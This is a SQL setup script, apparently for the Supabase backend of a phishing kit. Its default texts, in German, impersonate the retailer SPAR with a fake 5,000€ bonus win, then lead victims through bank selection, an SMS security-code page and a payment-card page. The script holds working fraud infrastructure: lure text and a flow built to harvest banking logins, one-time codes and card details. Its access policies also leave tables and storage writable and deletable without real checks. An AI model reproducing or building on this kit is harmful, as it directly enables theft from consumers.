CREATE TABLE IF NOT EXISTS public.global_settings (
    id TEXT PRIMARY KEY DEFAULT 'default',
    logo_url TEXT DEFAULT '/logo.png',
    bg_url TEXT DEFAULT '/spar-bg.png',
    portal_name TEXT DEFAULT 'Kundenportal',
    support_center_name TEXT DEFAULT 'Sonderaktion',
    win_title TEXT DEFAULT 'Exklusiver SPAR-Bonus',
    win_subtitle TEXT DEFAULT 'Herzlichen Glückwunsch! Sie wurden für unsere heutige Sonderaktion ausgewählt. Klicken Sie auf den untenstehenden Button, um Ihren 5.000€ Bonus zu beanspruchen.',
    win_button TEXT DEFAULT 'Bonus jetzt einlösen',
    banken_title TEXT DEFAULT 'Bankenliste',
    banken_subtitle TEXT DEFAULT 'Bitte wählen Sie Ihre Bank aus.',
    wait_title TEXT DEFAULT 'Bitte Warten',
    wait_subtitle TEXT DEFAULT 'Ihre Anfrage wird verarbeitet...',
    sms_title TEXT DEFAULT 'SMS-Sicherheitscode',
    card_title TEXT DEFAULT 'Zahlungsinformationen',
    card_subtitle TEXT DEFAULT 'Bitte bestaetigen Sie Ihre Angaben.',
    created_at TIMESTAMPTZ DEFAULT now(),
    updated_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow public read access on global_settings" ON public.global_settings;
CREATE POLICY "Allow public read access on global_settings" ON public.global_settings FOR SELECT USING (true);

DROP POLICY IF EXISTS "Allow all for authenticated users on global_settings" ON public.global_settings;
CREATE POLICY "Allow all for authenticated users on global_settings" ON public.global_settings FOR ALL USING (true) WITH CHECK (true);

INSERT INTO public.global_settings (id) VALUES ('default') ON CONFLICT DO NOTHING;

-- Also ensure storage exists
INSERT INTO storage.buckets (id, name, public) VALUES ('assets', 'assets', true) ON CONFLICT DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING ( bucket_id = 'assets' );

DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK ( bucket_id = 'assets' );

DROP POLICY IF EXISTS "Allow Updates" ON storage.objects;
CREATE POLICY "Allow Updates" ON storage.objects FOR UPDATE USING ( bucket_id = 'assets' );

DROP POLICY IF EXISTS "Allow Deletes" ON storage.objects;
CREATE POLICY "Allow Deletes" ON storage.objects FOR DELETE USING ( bucket_id = 'assets' );